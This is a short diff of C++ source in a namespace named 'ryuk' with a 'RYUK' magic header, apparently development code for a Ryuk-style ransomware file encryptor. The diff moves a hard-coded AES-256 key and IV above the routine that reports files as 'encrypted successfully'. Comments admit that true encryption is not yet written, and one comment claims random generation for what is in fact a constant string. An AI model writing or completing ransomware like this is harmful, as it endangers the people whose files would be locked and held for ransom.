@@ -464,7 +464,10 @@ namespace ryuk {
         const std::string MAGIC_HEADER = "RYUK";
         const int AES_BLOCK_SIZE = 16;
 
-        
+        // still need to write true encryption....
+        // Generate a random AES-256 key and IV
+        string key = "abcdefghijklmnopqrstuvwxyz123456";  // 32 bytes for AES-256 key
+        string iv = "abcdefghijklmnop";       // 16 bytes for AES IV            // Generate a random AES-256 key (32 bytes)
         _ftprintf_s(stderr, TEXT("generating AES key %s...\n"), key);
         _ftprintf_s(stderr, TEXT("generating AES IV %s...\n"), iv);
 
@@ -486,12 +489,7 @@ namespace ryuk {
             _ftprintf_s(stderr, TEXT("File %s encrypted already."), tFileLocation);
             return 4;
 
-        // still need to write true encryption....
-        // Generate a random AES-256 key and IV
-        string key = "abcdefghijklmnopqrstuvwxyz123456";  // 32 bytes for AES-256 key
-        string iv = "abcdefghijklmnop";       // 16 bytes for AES IV            // Generate a random AES-256 key (32 bytes)
-
-
+        
         _ftprintf_s(stderr, TEXT("File encrypted successfully!"), tFileLocation);
 
         return 0;
